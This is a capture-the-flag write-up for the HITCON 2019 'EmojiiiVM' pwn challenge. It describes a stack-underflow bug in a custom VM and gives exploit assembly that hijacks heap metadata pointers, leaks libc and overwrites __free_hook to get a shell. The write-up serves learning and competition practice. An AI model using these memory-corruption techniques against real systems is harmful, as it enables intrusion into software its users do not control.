# HITCON CTF Quals - 2019

## Pwn / 236 - EmojiiiVM

> Have you ever wrote an "emoji exploit" ?
> Well now it's your chance! Pwn the service and get the flag ;)
> 
> nc 3.115.176.164 30262
> 
> Author: bruce30262
> 39 Teams solved.

### Solution
by [@HexRabbit](https://blog.hexrabbit.io/)

> You may need check out rev & misc part of this challenge first

After reversing the binary, we found that almost every instruction doesn't do the bounding check on stack pointer, for instance:

![](https://i.imgur.com/9YapwkM.png)

By using this, we can trigger a stack underflow by executing `OP_AND` before anything got pushed onto the stack. 

Let's see what is placed before the stack buffer:

![](https://i.imgur.com/myFF7M0.png)

Global pointer(GPTR) list contains pointers that is used for dynamic allocation, the instruction `ALLOC`/`FREE` are used to Allocate/Free `GPTR[op]`, and `RDSTRI`/`PRSTRI` are used to Write/Print `GPTR[op]`

On allocation (`ALLOC`), VM will first allocate a tiny structure to store metadata, after that, allocate the real storage and store pointer into `buf`.
```cpp
struct heap_meta {
     long len;
     char *buf;
}
```


Exploit
---
First we make use of stack underflow to modify pointer on `GPTR` to point to user-controlled `heap_meta` structure to leak libc address, but although we can modify `GPTR` by stack underflow and leak heap pointer with `PRINT` instruction, there's no way to directly write to `GPTR`

So we have to do it on stack.

Below is part (I stripped the allocation part) of assembly used in exploitation to substitute 640 from `GPTR[9]`, make it point to `GPTR[3]->buf`
```
ADD;
ADD;

# -1 * 8 * 8 * 10 = -640
PUSH 1;
PUSH 0;
SUB;
PUSH 8;
PUSH 8;
PUSH 10;
MUL;
MUL;
MUL;
ADD; # GPTR[9] == GPTR[3]->buf
```

After libc address leak, with `heap_meta` structure controlled, we can also easily modify `__free_hook` with `RDSTRI` instruction and get shell.

```
POP; # make stack pointer point to &GPTR[8]
PRINT; # leak GPTR[8]

PUSH 3;
RDSTRI; # write p64(8), p64(GPTR[8] - 0x6b0)
PUSH 9;
PRSTRI; # leak base+0x3ebca0
PUSH 3;
RDSTRI; # write p64(8), p64(hook)
PUSH 9;
RDSTRI; # magic
PUSH 2;
FREE;
```
